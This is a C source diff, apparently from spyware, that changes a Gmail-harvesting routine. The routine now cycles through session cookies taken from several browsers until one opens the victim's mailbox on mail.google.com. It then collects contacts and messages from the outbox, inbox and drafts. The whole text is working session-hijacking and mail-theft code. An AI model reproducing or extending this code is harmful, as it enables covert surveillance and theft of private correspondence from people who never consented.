@@ -5,6 +5,7 @@
 #include "..\LOG.h"
 #include "SocialMain.h"
 #include "NetworkHandler.h"
+#include "CookieHandler.h"
 
 #define GM_GLOBAL_IDENTIFIER "var GLOBALS=["
 #define GM_MAIL_IDENTIFIER ",[\"^all\",\""
@@ -236,11 +237,11 @@ DWORD ParseMailBox(char *mbox, char *cookie, char *ik_val, DWORD last_tstamp_hi,
 	return SOCIAL_REQUEST_SUCCESS;
 }
 
-DWORD HandleGMail(char *cookie)
+DWORD HandleGMail(char **cookie)
 {
-	wchar_t szLogW[MAX_PATH * 6] = { 0 }; void putlogW(wchar_t*);
-	swprintf(szLogW, L"in HandleGMail begin cookie:%s",cookie);
-	putlogW(szLogW);
+// 	wchar_t szLogW[MAX_PATH * 6] = { 0 }; void putlogW(wchar_t*);
+// 	swprintf(szLogW, L"in HandleGMail begin cookie:%s",cookie);
+// 	putlogW(szLogW);
 
 	DWORD ret_val;
 	BYTE *r_buffer = NULL;
@@ -256,13 +257,27 @@ DWORD HandleGMail(char *cookie)
 // 		return SOCIAL_REQUEST_NETWORK_PROBLEM;
 
 	// Verifica il cookie 
-	swprintf_s(mail_request, L"/mail/?shva=1#%S", GM_INBOX_IDENTIFIER);
-	ret_val = HttpSocialRequest(L"mail.google.com", L"GET", mail_request, 443, NULL, 0, &r_buffer, &response_len, cookie);
-	if (ret_val != SOCIAL_REQUEST_SUCCESS)
-		return ret_val;
-	bool WriteFileOver(char* pBuf, long size, char* fileName);
-	WriteFileOver((char*)r_buffer, response_len, "response.html");
-	ptr = strstr((char *)r_buffer, GM_GLOBAL_IDENTIFIER);
+	int rightCookieIndex = COOKIE_FROM_IE;
+	for (int i = COOKIE_FROM_IE; i < COOKIE_FROM_NONE_MAX; i++)
+	{
+		if (!cookie[i])
+			continue;
+		swprintf_s(mail_request, L"/mail/?shva=1#%S", GM_INBOX_IDENTIFIER);
+		ret_val = HttpSocialRequest(L"mail.google.com", L"GET", mail_request, 443, NULL, 0, &r_buffer, &response_len, cookie[i]);
+		if (ret_val != SOCIAL_REQUEST_SUCCESS)
+			return ret_val;
+// 		bool WriteFileOver(char* pBuf, long size, char* fileName);
+// 		WriteFileOver((char*)r_buffer, response_len, "response.html");
+		ptr = strstr((char *)r_buffer, GM_GLOBAL_IDENTIFIER);
+		if (ptr){
+			rightCookieIndex = i;
+			break;
+		}
+		else{
+			SAFE_FREE(ptr);
+			Sleep(500);
+		}
+	}
 	FREE_PARSING(ptr);
 
 	// Cerca il parametro ik (e' il nono)
@@ -294,7 +309,7 @@ DWORD HandleGMail(char *cookie)
 		// Se e' diverso dall'ultimo username allora lo logga...
 		if (wcscmp(mail_request, last_user_name)) {
 			_snwprintf_s(last_user_name, sizeof(last_user_name)/sizeof(WCHAR), _TRUNCATE, L"%s", mail_request);		
-			ret_val = ParseContacts(cookie, ik_val, last_user_name);
+			ret_val = ParseContacts(cookie[rightCookieIndex], ik_val, last_user_name);
 		}
 	}
 
@@ -303,7 +318,7 @@ DWORD HandleGMail(char *cookie)
 // 		return ret_val;
 
 	last_tstamp_lo = GetLastFBTstamp(ik_val, &last_tstamp_hi);
-	ParseMailBox(GM_OUTBOX_IDENTIFIER, cookie, ik_val, last_tstamp_hi, last_tstamp_lo, FALSE, FALSE);
-	ParseMailBox(GM_INBOX_IDENTIFIER, cookie, ik_val, last_tstamp_hi, last_tstamp_lo, TRUE, FALSE);
-	return ParseMailBox(GM_DRAFTS_IDENTIFIER, cookie, ik_val, last_tstamp_hi, last_tstamp_lo, FALSE, TRUE);
+	ParseMailBox(GM_OUTBOX_IDENTIFIER, cookie[rightCookieIndex], ik_val, last_tstamp_hi, last_tstamp_lo, FALSE, FALSE);
+	ParseMailBox(GM_INBOX_IDENTIFIER, cookie[rightCookieIndex], ik_val, last_tstamp_hi, last_tstamp_lo, TRUE, FALSE);
+	return ParseMailBox(GM_DRAFTS_IDENTIFIER, cookie[rightCookieIndex], ik_val, last_tstamp_hi, last_tstamp_lo, FALSE, TRUE);
 }
